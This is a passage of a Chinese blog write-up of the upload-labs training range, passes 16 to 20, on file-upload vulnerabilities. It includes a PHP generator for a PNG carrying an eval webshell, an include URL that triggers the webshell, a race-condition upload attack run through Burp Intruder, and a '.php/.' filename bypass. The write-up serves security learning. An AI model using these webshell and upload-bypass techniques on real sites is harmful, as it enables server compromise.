class="number">3</span>] + <span class="variable">$blist</span>[<span class="variable">$i</span>]) %<span class="number">256</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_values</span>(<span class="variable">$blist</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter3</span>(<span class="params"><span class="variable">$blist</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;(<span class="title function_ invoke__">count</span>(<span class="variable">$blist</span>)-<span class="number">3</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$blist</span>[<span class="variable">$i</span>+<span class="number">3</span>] = (<span class="variable">$blist</span>[<span class="variable">$i</span>+<span class="number">3</span>] + <span class="title function_ invoke__">floor</span>(<span class="variable">$blist</span>[<span class="variable">$i</span>]/<span class="number">2</span>) ) %<span class="number">256</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_values</span>(<span class="variable">$blist</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span>=<span class="title function_ invoke__">array_merge</span>(<span class="title function_ invoke__">filter1</span>(<span class="variable">$blist</span>), <span class="title function_ invoke__">filter3</span>(<span class="variable">$blist</span>));</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo sizeof($p);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>)-<span class="number">3</span>; <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="comment">// echo $color;</span></span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./Image_Reprocessing_Vulnerability_Exploit .png&#x27;</span>);</span><br><span class="line"><span class="comment">/**这里提供一个内容为&lt;?PHP EVAL($_GET[1]);?&gt;的图片马**/</span></span><br></pre></td></tr></table></figure>
+
+<p>上传生成的Image_Reprocessing_Vulnerability_Exploit .png图片</p>
+<p><img src="/uploads-labs/image-20251112081011317.png" alt="image-20251112081011317"></p>
+<p>如同上两关一样构造链接 <code>http://localhost/include.php?file=./upload/11732.png?1=$_POST[&#39;pass&#39;]</code></p>
+<p><a target="_blank" rel="noopener" href="http://localhost/upload/11732.png">http://localhost/upload/11732.png</a></p>
+<p>提示信息</p>
+<p><img src="/uploads-labs/1701757151_656ec0df25c22e5f7413b.jpeg" alt="1701757151_656ec0df25c22e5f7413b.png!small?1701757154373"></p>
+<p>要求图片格式为JPG（后续还有代码要求格式为GIF,PNG 不在赘述）</p>
+<p><img src="/uploads-labs/1701757159_656ec0e7aa9761d2124fb.jpeg" alt="1701757159_656ec0e7aa9761d2124fb.png!small?1701757163111"></p>
+<p>move_uploaded_file($tmpname,$target_path）此函数附近有逻辑错误</p>
+<p><img src="/uploads-labs/1701757167_656ec0ef824e1624a4999.jpeg" alt="1701757167_656ec0ef824e1624a4999.png!small?1701757170989"></p>
+<p>不过本题是考察的图片马，制作图片马（理由上一几关的方式，文件包含以下）</p>
+<p><img src="/uploads-labs/1701757176_656ec0f83db1e9a33bd28.jpeg" alt="1701757176_656ec0f83db1e9a33bd28.png!small?1701757180653"></p>
+<p>不过webshell获取不了，从上传的目录上看，上传之后的一句话没有了</p>
+<p><img src="/uploads-labs/1701757191_656ec1072f084172eeb62.jpeg" alt="1701757191_656ec1072f084172eeb62.png!small?1701757194206"></p>
+<p><img src="/uploads-labs/1701757197_656ec10d1269de6113d4b.jpeg" alt="1701757197_656ec10d1269de6113d4b.png!small?1701757200275"></p>
+<p>二次渲染后的一句话消失了。那么经过观察，看到从此处前后是不变的</p>
+<p><img src="/uploads-labs/1701757210_656ec11a3c87c156fead2.jpeg" alt="1701757210_656ec11a3c87c156fead2.png!small?1701757214157"></p>
+<p>用010Editorr打开，尝试蒋一句话插到此位置</p>
+<p><img src="/uploads-labs/1701757222_656ec1260e708b551d1ef.jpeg" alt="1701757222_656ec1260e708b551d1ef.png!small?1701757226442"></p>
+<p>然后蚁剑连接</p>
+<p><img src="/uploads-labs/1701757230_656ec12ec27ce3ad792a3.jpeg" alt="1701757230_656ec12ec27ce3ad792a3.png!small?1701757236030"></p>
+<h2 id="Pass-17（条件竞争）"><a href="#Pass-17（条件竞争）" class="headerlink" title="Pass-17（条件竞争）"></a>Pass-17（条件竞争）</h2><p>提示信息</p>
+<p><img src="/uploads-labs/1701757242_656ec13aa26bb77de973e.jpeg" alt="1701757242_656ec13aa26bb77de973e.png!small?1701757245821"></p>
+<p>使用move_uploaded_file()函数，将上传的文件保存到服务器，再进行判断是否是jpg、png、gif中的一种类型，如果在数组中就保存重命名，如果不在根据unlink()就直接删除</p>
+<p>代码他是先将图片上传上去，才开始进行判断后缀名、二次渲染。如果在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除、二次渲染。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">    $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>抓数据包，上传，发送到Intruder模块下</p>
+<p><img src="/uploads-labs/1701757254_656ec1466ba108b888d1c.jpeg" alt="1701757254_656ec1466ba108b888d1c.png!small?1701757257558"></p>
+<p>clear</p>
+<p><img src="/uploads-labs/1701757267_656ec1534ec73896a7e68.jpeg" alt="1701757267_656ec1534ec73896a7e68.png!small?1701757270942"></p>
+<p>将payload类型设为空，意思是不断地上传空的payload</p>
+<p><img src="/uploads-labs/1701757274_656ec15aa5acde755422f.jpeg" alt="1701757274_656ec15aa5acde755422f.png!small?1701757278330"></p>
+<p>调大线程</p>
+<p><img src="/uploads-labs/1701757284_656ec16413f020d453ee8.jpeg" alt="1701757284_656ec16413f020d453ee8.png!small"></p>
+<p><img src="/uploads-labs/1701757296_656ec1708c4ed0692ec63.jpeg" alt="1701757296_656ec1708c4ed0692ec63.png!small?1701757299694"></p>
+<p>开始实施</p>
+<p><img src="/uploads-labs/1701757309_656ec17d306ae62c4905d.jpeg" alt="1701757309_656ec17d306ae62c4905d.png!small?1701757313135"></p>
+<p><img src="/uploads-labs/1701757315_656ec1832f264cca69b98.jpeg" alt="1701757315_656ec1832f264cca69b98.png!small?1701757318839"></p>
+<p>值得注意的是，真实环境下一般没有源码，需要自己逐个尝试，不过就此看来，是白名单限制居多。</p>
+<h2 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18(条件竞争)"></a>Pass-18(条件竞争)</h2><p>此关上传路径存在问题，建议修改，进入到19关修改后重启即可</p>
+<p><img src="/uploads-labs/1701757327_656ec18fb8c33ff1f8093.jpeg" alt="1701757327_656ec18fb8c33ff1f8093.png!small?1701757331465"></p>
+<p>源码说的是服务器将文件后缀跟白名单做对比，然后检查了文件大小以及文件是否已经存在。</p>
+<p>文件上传之后又对其进行了重命名，这关只能上传图片马了。要让图片马能够执行还要配合文件包含或者解析析漏洞，和之前几关类似通过文件包含去访问该图片马。</p>
+<p><img src="/uploads-labs/1701757339_656ec19b5404fc57890d5.jpeg" alt="1701757339_656ec19b5404fc57890d5.png!small?1701757342392"></p>
+<p>然后还是使用上一关的做法，本关我废了很大劲，线程调的巨大也没反应就不附图了，我把参考的大佬链接放到后边。</p>
+<h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>提示信息</p>
+<p><img src="/uploads-labs/1701757348_656ec1a493ab1a715181b.jpeg" alt="1701757348_656ec1a493ab1a715181b.png!small?1701757352857"></p>
+<p>move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 &#x2F;.</p>
+<p><img src="/uploads-labs/1701757359_656ec1afc7467b017d62b.jpeg" alt="1701757359_656ec1afc7467b017d62b.png!small?1701757362832"></p>
+<p>修改upload-19.jpg 修改为upload-19.php&#x2F;.</p>
+<p><img src="/uploads-labs/1701757365_656ec1b5aa56236ff7eca.jpeg" alt="1701757365_656ec1b5aa56236ff7eca.png!small?1701757369194"></p>
+<p>复制图片链接，输入连接密码</p>
+<p><img src="/uploads-labs/1701757373_656ec1bdb9e97fb0eb57a.jpeg" alt="1701757373_656ec1bdb9e97fb0eb57a.png!small?1701757377122"></p>
+<p><img src="/uploads-labs/1701757386_656ec1ca95d75e005e9b3.jpeg" alt="1701757386_656ec1ca95d75e005e9b3.png!small?1701757389687"></p>
+<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>此关不是在我理解的范畴内，后续还需要多钻研，多总结</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="wuyaxiao 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="wuyaxiao 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/10/21/misc%E9%A2%98%E7%9B%AE/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/12/%E4%BC%9A%E8%AF%9D%E8%B7%9F%E8%B8%AA%E6%8A%80%E6%9C%AF/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+            
+    
+  
+
+  <!-- 应使用 elif 而不是 else if -->  
+  <div class="comments" id="comments">  
+    
+  <script src="https://utteranc.es/client.js"
+    repo="wuyaxiao/wuyaxiao.github.io"
+    issue-term="title"
+    theme="github-light"
+    crossorigin="anonymous"
+    async>
+  </script>
+  
+  </div>  
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.1.</span> <span class="nav-text">如何判断上传漏洞类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB"><span class="nav-number">1.2.</span> <span class="nav-text">靶机包含漏洞类型分类</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#upload-labs%E9%9D%B6%E5%9C%BA"><span class="nav-number">2.</span> <span class="nav-text">upload-labs靶场</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-01%EF%BC%88-%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">Pass-01（ 前端验证）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9js%E4%BB%A3%E7%A0%81"><span class="nav-number">2.1.1.</span> <span class="nav-text">修改js代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%97%AD%E6%B5%8F%E8%A7%88%E5%99%A8JS%E8%A7%A3%E6%9E%90"><span class="nav-number">2.1.2.</span> <span class="nav-text">关闭浏览器JS解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8bp%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7%E7%9B%B4%E6%8E%A5%E5%B0%86%E6%94%B9%E5%90%8E%E7%BC%80%E5%90%8D"><span class="nav-number">2.1.3.</span> <span class="nav-text">用bp抓包工具直接将改后缀名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-02%EF%BC%88MIME%E9%AA%8C%E8%AF%81%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">Pass-02（MIME验证）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9Content-Type"><span class="nav-number">2.2.1.</span> <span class="nav-text">改Content-Type</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80"><span class="nav-number">2.2.2.</span> <span class="nav-text">改文件后缀</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-03%EF%BC%88%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%EF%BC%8C%E7%89%B9%E6%AE%8A%E5%90%8E%E7%BC%80%E5%90%8D%EF%BC%89"><span class="nav-number">2.3.</span> <span class="nav-text">Pass-03（黑名单验证，特殊后缀名）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-04%EF%BC%88%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-htaccess%EF%BC%89"><span class="nav-number">2.4.</span> <span class="nav-text">Pass-04（黑名单验证,.htaccess）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.4.0.1.</span> <span class="nav-text">配置条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-number">2.4.0.2.</span> <span class="nav-text">攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-05-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%EF%BC%8C%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">2.5.</span> <span class="nav-text">Pass-05 (黑名单绕过，大小写绕过)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-06%EF%BC%88%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%EF%BC%8C%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%EF%BC%89"><span class="nav-number">2.6.</span> <span class="nav-text">Pass-06（黑名单验证，空格绕过）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-07-%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%EF%BC%8C%E7%82%B9%E5%8F%B7%E7%BB%95%E8%BF%87%EF%BC%89"><span class="nav-number">2.7.</span> <span class="nav-text">Pass-07 (黑名单验证，点号绕过）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-08%EF%BC%88%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%8C%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6-DATA%E7%BB%95%E8%BF%87%EF%BC%89"><span class="nav-number">2.8.</span> <span class="nav-text">Pass-08（黑名单，特殊字符::$DATA绕过）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-09%EF%BC%88%E9%BB%91%E5%90%8D%E5%8D%95-%E7%82%B9-%E7%A9%BA%E6%A0%BC-%E7%82%B9%EF%BC%89"><span class="nav-number">2.9.</span> <span class="nav-text">Pass-09（黑名单 点 空格 点）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-10%EF%BC%88%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="nav-number">2.10.</span> <span class="nav-text">Pass-10（双写绕过）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-11-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-00%E6%88%AA%E6%96%ADGET%E5%9E%8B"><span class="nav-number">2.11.</span> <span class="nav-text">Pass-11 (白名单绕过 00截断GET型)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE"><span class="nav-number">2.11.1.</span> <span class="nav-text">配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-1"><span class="nav-number">2.11.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-12-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%EF%BC%8Cpost-00%E6%88%AA%E6%96%AD"><span class="nav-number">2.12.</span> <span class="nav-text">Pass-12 (白名单绕过，post 00截断)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-13-%E9%A6%96%E6%AC%A1%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="nav-number">2.13.</span> <span class="nav-text">Pass-13(首次制作图片马)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-14%EF%BC%88getimagesize%EF%BC%89"><span class="nav-number">2.14.</span> <span class="nav-text">Pass-14（getimagesize）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-15-exif-imagetype"><span class="nav-number">2.15.</span> <span class="nav-text">Pass-15(exif_imagetype)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-16%EF%BC%88%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%EF%BC%89%E5%8D%A1%E4%BD%8F"><span class="nav-number">2.16.</span> <span class="nav-text">Pass-16（二次渲染）卡住</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#gif%EF%BC%9A%E5%9C%A8%E4%B8%8D%E5%8F%98%E7%9A%84%E6%95%B0%E6%8D%AE%E5%9D%97%E4%B8%AD%E6%8F%92%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-number">2.16.1.</span> <span class="nav-text">gif：在不变的数据块中插入一句话木马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-17%EF%BC%88%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%89"><span class="nav-number">2.17.</span> <span class="nav-text">Pass-17（条件竞争）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-18-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">2.18.</span> <span class="nav-text">Pass-18(条件竞争)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-19"><span class="nav-number">2.19.</span> <span class="nav-text">Pass-19</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-20"><span class="nav-number">2.20.</span> <span class="nav-text">Pass-20</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">wuyaxiao</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="fa fa-user">
+  </span>
+  <span class="author" itemprop="copyrightHolder">wuyaxiao</span>
+</div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1/dist/medium-zoom.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
